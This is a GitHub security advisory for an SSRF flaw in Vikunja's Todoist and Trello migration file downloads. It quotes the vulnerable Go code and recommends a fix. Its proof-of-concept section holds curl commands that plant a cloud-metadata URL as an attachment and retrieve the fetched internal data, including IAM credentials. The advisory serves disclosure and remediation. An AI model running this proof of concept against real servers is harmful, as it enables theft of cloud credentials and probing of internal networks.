# [M] Vikunja has SSRF via Todoist/Trello Migration File Attachment URLs that Allows Reading Internal Network Resources

## Summary
Severity: Medium
Advisory: GHSA-g66v-54v9-52pr
CVE: CVE-2026-33675
CWE: CWE-918
Ecosystem: Go
CVSS: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:L/I:N/A:L (CVSS_V3)
Published: 2026-03-25
Source: https://github.com/advisories/GHSA-g66v-54v9-52pr
Type: github-advisory

## Affected
- Go: `code.vikunja.io/api` — affected >=0 <2.2.1

## Details
## Summary

The migration helper functions `DownloadFile` and `DownloadFileWithHeaders` in `pkg/modules/migration/helpers.go` make arbitrary HTTP GET requests without any SSRF protection. When a user triggers a Todoist or Trello migration, file attachment URLs from the third-party API response are passed directly to these functions, allowing an attacker to force the Vikunja server to fetch internal network resources and return the response as a downloadable task attachment.

## Details

The vulnerability exists because the migration HTTP client uses a plain `http.Client{}` with no URL validation, no private IP blocklist, no redirect restrictions, and no response size limit.

**Vulnerable code** in `pkg/modules/migration/helpers.go:38-59`:
```go
func DownloadFileWithHeaders(url string, headers http.Header) (buf *bytes.Buffer, err error) {
	req, err := http.NewRequestWithContext(context.Background(), http.MethodGet, url, nil)
	if err != nil {
		return nil, err
	}
	// ... headers added ...
	hc := http.Client{}
	resp, err := hc.Do(req)
	// ... no URL validation, no IP filtering ...
	buf = &bytes.Buffer{}
	_, err = buf.ReadFrom(resp.Body) // no size limit
	return
}
```

**Call site in Todoist migration** (`pkg/modules/migration/todoist/todoist.go:433-435`):
```go
if len(n.FileAttachment.FileURL) > 0 {
	buf, err := migration.DownloadFile(n.FileAttachment.FileURL)
```

The `FileURL` is deserialized directly from the Todoist Sync API response (`json:"file_url"` tag at line 125) with no validation.

**Call sites in Trello migration** (`pkg/modules/migration/trello/trello.go`):
- Line 263: `migration.DownloadFile(board.Prefs.BackgroundImage)` — board background
- Line 345: `migration.DownloadFileWithHeaders(attachment.URL, ...)` — card attachments
- Line 381: `migration.DownloadFile(cover.URL)` — card cover images

Notably, the webhooks module in the same codebase was recently patched (commit `8d9bc3e`) to add SSRF protection using the `daenney/ssrf` library, but this protection was **not applied** to the migration module — making this an incomplete fix.

**Attack flow:**
1. Attacker creates a Todoist account
2. Using the Todoist Sync API, attacker creates a note with `file_attachment.file_url` set to an internal URL (e.g., `http://169.254.169.254/latest/meta-data/iam/security-credentials/`)
3. Attacker authenticates to the target Vikunja instance and initiates a Todoist migration
4. Vikunja's server fetches the internal URL and stores the response body as a task attachment
5. Attacker downloads the attachment through the normal Vikunja API, reading the internal resource contents

## PoC

**Prerequisites:**
- Vikunja instance with Todoist migration enabled (admin has configured OAuth client ID/secret)
- Authenticated Vikunja user account
- Todoist account controlled by the attacker

**Step 1: Craft malicious Todoist data**

Using the Todoist Sync API, create a note with an internal URL as the file attachment:

```bash
curl -X POST "https://api.todoist.com/sync/v9/sync" \
  -H "Authorization: Bearer $TODOIST_TOKEN" \
  -d 'commands=[{
    "type": "note_add",
    "temp_id": "ssrf-test-1",
    "uuid": "550e8400-e29b-41d4-a716-446655440001",
    "args": {
      "item_id": "'$ITEM_ID'",
      "content": "test note",
      "file_attachment": {
        "file_name": "metadata.txt",
        "file_size": 1,
        "file_type": "text/plain",
        "file_url": "http://169.254.169.254/latest/meta-data/"
      }
    }
  }]'
```

**Step 2: Trigger migration on Vikunja**

```bash
# Authenticate to Vikunja
TOKEN=$(curl -s -X POST "https://vikunja.example.com/api/v1/login" \
  -H "Content-Type: application/json" \
  -d '{"username":"attacker","password":"password"}' | jq -r .token)

# Initiate Todoist OAuth flow
curl -s "https://vikunja.example.com/api/v1/migration/todoist/auth" \
  -H "Authorization: Bearer $TOKEN"

# After OAuth callback, trigger the migration
curl -s -X POST "https://vikunja.example.com/api/v1/migration/todoist/migrate" \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"code":"<oauth_code>"}'
```

**Step 3: Download the attachment containing internal data**

```bash
# List tasks to find the attachment ID
curl -s "https://vikunja.example.com/api/v1/projects" \
  -H "Authorization: Bearer $TOKEN"

# Download the attachment (contains response from internal URL)
curl -s "https://vikunja.example.com/api/v1/tasks/<task_id>/attachments/<attachment_id>" \
  -H "Authorization: Bearer $TOKEN" -o metadata.txt

cat metadata.txt
# Expected: cloud instance metadata, internal service responses, etc.
```

## Impact

An authenticated attacker can:

- **Read cloud instance metadata**: Access `http://169.254.169.254/` to retrieve IAM credentials, instance identity, and configuration data on AWS/GCP/Azure deployments
- **Probe internal network services**: Map internal infrastructure by making requests to RFC1918 addresses (10.x, 172.16.x, 192.168.x)
- **Access internal APIs**: Reach internal services that trust requests from the Vikunja server's network position
- **Denial of service**: Since `buf.ReadFrom(resp.Body)` has no size limit, pointing to a large or streaming resource causes unbounded memory allocation on the Vikunja server

The attack requires the target Vikunja instance to have Todoist or Trello migration enabled (requires admin configuration of OAuth credentials), but this is a standard deployment configuration.

## Recommended Fix

Apply the same SSRF protection already used for webhooks (`daenney/ssrf`) to the migration HTTP clients. In `pkg/modules/migration/helpers.go`:

```go
import (
    "github.com/daenney/ssrf"
    "code.vikunja.io/api/pkg/config"
)

func safeMigrationClient() *http.Client {
    s, _ := ssrf.New(ssrf.WithAnyPort())
    return &http.Client{
        Transport: &http.Transport{
            DialContext: (&net.Dialer{
                Control: s.Safe,
            }).DialContext,
        },
    }
}

func DownloadFileWithHeaders(url string, headers http.Header) (buf *bytes.Buffer, err error) {
    req, err := http.NewRequestWithContext(context.Background(), http.MethodGet, url, nil)
    if err != nil {
        return nil, err
    }
    for key, h := range headers {
        for _, hh := range h {
            req.Header.Add(key, hh)
        }
    }

    hc := safeMigrationClient()
    resp, err := hc.Do(req)
    if err != nil {
        return nil, err
    }
    defer resp.Body.Close()

    // Limit response body to 100MB to prevent memory exhaustion
    buf = &bytes.Buffer{}
    _, err = buf.ReadFrom(io.LimitReader(resp.Body, 100*1024*1024))
    return
}
```

Apply the same pattern to `DoGetWithHeaders` and `DoPostWithHeaders` in the same file.

## References
- https://github.com/go-vikunja/vikunja/security/advisories/GHSA-g66v-54v9-52pr
- https://nvd.nist.gov/vuln/detail/CVE-2026-33675
- https://github.com/go-vikunja/vikunja/commit/93297742236e3d33af72c993e5da960db01d259e
- https://github.com/go-vikunja/vikunja
- https://vikunja.io/changelog/vikunja-v2.2.2-was-released
